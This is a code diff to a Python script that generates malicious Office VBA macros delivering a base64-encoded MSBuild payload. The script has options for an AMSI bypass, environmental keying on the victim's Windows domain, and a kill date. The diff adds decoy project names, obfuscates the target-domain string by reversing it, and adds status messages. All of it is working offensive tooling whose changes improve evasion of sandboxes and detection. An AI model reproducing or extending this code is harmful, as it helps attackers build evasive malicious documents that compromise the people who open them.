@@ -105,7 +105,7 @@ def generate_macro(msbuild_template, amsi_bypass=False, sandbox=False, killdate=
 		"TrackPackageWeb","DebugInfo","CoppisAdditions","BusinessLayer",
 		"NativeClientVSAddIn", "WikiUpdater","AuthorizeNet.Helpers",
 		"CreateWordDoc","TimeSeries","JUpdate","UnityImageProcessing",
-		"LogicLayer"])
+		"LogicLayer","Common7","BillingStatement"])
 
 	msbuild_encoded = base64.b64encode(minimize(msbuild_template))
 	chunk = list(chunks(msbuild_encoded,200))
@@ -180,8 +180,7 @@ def generate_macro(msbuild_template, amsi_bypass=False, sandbox=False, killdate=
 
 	if sandbox is not None:
 		macro_str += 'Function ' + Method3 + '()\n'		
-		domains = ' + '.join(['Chr({})'.format(ord(i)) for i in sandbox.lower()])
-		macro_str += '  arrDomains = Split(%s, Chr(44))\n' % domains
+		macro_str += '  arrDomains = Split(Replace(StrRev("%s"),"###",","), ",")\n' % sandbox.replace(",","###")[::-1].lower()
 		macro_str += '  If (UBound(Filter(arrDomains, LCASE(Environ("USERDOMAIN")))) > -1) = True Then\n'
 		macro_str += '    ' + Method
 		macro_str += "\n  End If\n"
@@ -258,6 +257,8 @@ def output_file(filename,data):
 	output = open(filename,"w")
 	output.write(data)
 	output.close()
+	print "[+] {} macro sucessfully saved to disk.".format(filename)
+
 
 def banner():
    return """
@@ -308,7 +309,13 @@ if __name__ == "__main__":
       sys.exit(0)
 
    if msbuild_payload != '':
-   	print "[*] Writing msbuild {} payload.".format(payload)
+   	print "[+] Writing msbuild {} payload.".format(payload)
    	macro = generate_macro(msbuild_payload, amsi_bypass, domain, killdate)
+   	
+   	if domain is not None:
+   		print "[+] Using environmental keying with {} domains".format(domain)
+ 
+   	if killdate is not None:
+   		print "[+] Macro kill date is: {}!".format(killdate)
+
    	output_file(output,macro)
-   	print "[*] {} macro sucessfully saved to disk.".format(output)
